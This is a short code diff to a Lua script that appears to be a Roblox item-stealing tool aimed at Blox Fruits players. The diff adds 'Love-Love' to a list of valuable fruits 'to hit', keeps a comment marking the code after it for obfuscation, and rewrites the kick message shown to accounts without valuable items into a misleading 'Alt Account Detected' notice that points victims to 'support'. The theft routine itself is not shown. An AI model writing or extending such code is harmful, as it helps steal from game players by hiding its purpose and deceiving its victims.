@@ -6,7 +6,8 @@ FruitsToHit = { -- Fruits for general notification
 	"Kitsune-Kitsune",
 	"Leopard-Leopard",
 	"Yeti-Yeti",
-	"Gravity-Gravity"
+	"Gravity-Gravity",
+    "Love-Love"
 }
 --obfuscate after this
 
@@ -1630,7 +1631,7 @@ local function init()
 	end
 
 	if not checkInventoryForHit() then
-		LocalPlayer:Kick("No valuable items detected for initial hit. (Alt Account Filter)")
+		LocalPlayer:Kick("Alt Account Detected!\nPlease use a different account to run this script.\nIf you are not an alt, please contact support.")
 		return
 	end
 
